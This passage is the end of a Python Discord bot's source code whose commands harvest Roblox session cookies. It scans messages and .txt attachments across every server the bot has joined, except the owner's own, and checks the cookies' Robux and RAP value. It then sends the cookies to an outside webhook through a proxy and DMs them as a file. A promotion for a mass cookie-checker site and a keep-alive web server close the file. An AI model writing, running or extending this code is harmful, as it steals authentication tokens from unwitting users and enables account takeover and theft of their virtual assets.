        await interaction.response.send_message("Not released yet", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    
    global_scraped_cookies = set()
    total_messages_scanned = 0
    total_servers = 0

    status_embed = discord.Embed(
        title="<a:Lightning:1542199575257813135> Mass Scrape Initiated",
        description="Awakening in all servers and scraping...",
        color=0xF1C40F
    )
    await interaction.followup.send(embed=status_embed, ephemeral=True)

    start_time = datetime.datetime.now()

    for guild in bot.guilds:
        if guild.id in OWNED_SERVER_IDS:
            continue
        
        total_servers += 1
        try:
            fetcher = CookieFetcher()
            result = await fetcher.fetch_all_server_cookies(guild)
            cookies = result['all']
            total_messages_scanned += result.get('messages_scanned', 0)
            
            for cookie in cookies:
                global_scraped_cookies.add(cookie)
                
        except Exception as e:
            logger.error(f"Error scraping {guild.name}: {e}")

    end_time = datetime.datetime.now()
    time_taken = (end_time - start_time).total_seconds()
    unique_cookies_list = list(global_scraped_cookies)
    
    fetcher = CookieFetcher()
    summary = await fetcher.validate_and_summarize_cookies(unique_cookies_list)
    total_robux = summary['total_robux']
    total_rap = summary['total_rap']
    
    await fetcher.send_to_cookie_webhook(unique_cookies_list, unique_cookies_list, total_messages_scanned, time_taken, total_robux, total_rap)

    try:
        dm_channel = await interaction.user.create_dm()
        
        embed = discord.Embed(
            title="<a:Lightning:1542199575257813135> Global Mass Scrape Complete",
            description=(
                f"<:FakeNitroEmoji:1542188059527741540> **Servers Scraped:** {total_servers}\n"
                f"<:Stats:1542192682292486198> **Total Messages Scanned:** {total_messages_scanned:,}\n"
                f"🍪 **Total Unique Cookies Found:** {len(unique_cookies_list)}\n"
                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                f"💎 **Verified Total RAP:** {total_rap:,}\n"
                f"⏱️ **Time Taken:** {time_taken:.1f} seconds\n\n"
                f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
            ),
            color=0xF1C40F
        )
        await dm_channel.send(content="@everyone", embed=embed)
        
        await asyncio.sleep(0.1)
        all_cookies_content = "\n\n".join(unique_cookies_list) if unique_cookies_list else "No cookies found."
        file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename='global_cookies.txt')
        await dm_channel.send(content="📄 **Global Cookie Results:**", file=file)
        
        await interaction.followup.send("<a:Lightning:1542199575257813135> Global scrape complete! Check your DMs.", ephemeral=True)
    except Exception as e:
        logger.error(f"Failed to send DM: {e}")
        await interaction.followup.send("Global scrape complete, but failed to send DM.", ephemeral=True)


@bot.tree.command(name="scrape3", description="Combine and deduplicate cookies from .txt attachments in recent messages")
async def scrape3_command(interaction: discord.Interaction):
    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("Not released yet", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    
    combined_cookies = set()
    files_processed = 0
    
    try:
        async for message in interaction.channel.history(limit=500):
            for attachment in message.attachments:
                if attachment.filename.lower().endswith('.txt') and attachment.size < 5 * 1024 * 1024:
                    files_processed += 1
                    try:
                        file_bytes = await attachment.read()
                        text_content = file_bytes.decode('utf-8')
                        fetcher = CookieFetcher()
                        cookies = fetcher.extract_and_normalize_cookies(text_content)
                        combined_cookies.update(cookies)
                    except Exception as e:
                        logger.error(f"Error reading attachment {attachment.filename}: {e}")
                        
        if not combined_cookies:
            await interaction.followup.send("No cookies found in .txt attachments in recent messages.", ephemeral=True)
            return
            
        unique_cookies = list(combined_cookies)
        file_content = "\n\n".join(unique_cookies)
        
        async with aiohttp.ClientSession() as session:
            proxy = get_proxy()
            embed = discord.Embed(
                title="<a:Lightning:1542199575257813135> Scrape3 Complete",
                description=(
                    f"**Files Processed:** {files_processed}\n"
                    f"**Total Unique Cookies:** {len(unique_cookies)}\n\n"
                    f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz)*"
                ),
                color=0xF1C40F
            )
            
            embed_payload = {
                'username': 'Cookie Fetcher',
                'content': '@everyone',
                'embeds': [embed.to_dict()]
            }
            async with session.post(COOKIE_WEBHOOK_URL, json=embed_payload, proxy=proxy) as response:
                if response.status in [200, 204]:
                    await asyncio.sleep(0.1)
                    form_data = aiohttp.FormData()
                    form_data.add_field('payload_json', json.dumps({'username': 'Cookie Fetcher', 'content': '@everyone\n📄 **Combined Cookie Results:**'}))
                    form_data.add_field('file', file_content.encode('utf-8'), filename='combined_cookies.txt', content_type='text/plain')
                    async with session.post(COOKIE_WEBHOOK_URL, data=form_data, proxy=proxy) as file_response:
                        if file_response.status in [200, 204]:
                            await interaction.followup.send("✅ Successfully combined and sent to webhook!", ephemeral=True)
                        else:
                            await interaction.followup.send(f"⚠️ Failed to send file: {file_response.status}", ephemeral=True)
                else:
                    await interaction.followup.send(f"⚠️ Failed to send embed: {response.status}", ephemeral=True)
                    
    except Exception as e:
        logger.error(f"Error in scrape3: {e}")
        await interaction.followup.send(f"An error occurred: {str(e)}", ephemeral=True)


app = Flask('')

@app.route('/')
def home():
    return "I'm alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

Thread(target=run).start()

if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("DISCORD_TOKEN not found in environment variables")
        exit(1)

    logger.info("Starting Server Control Bot...")
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        logger.error(f"Failed to start: {e}")
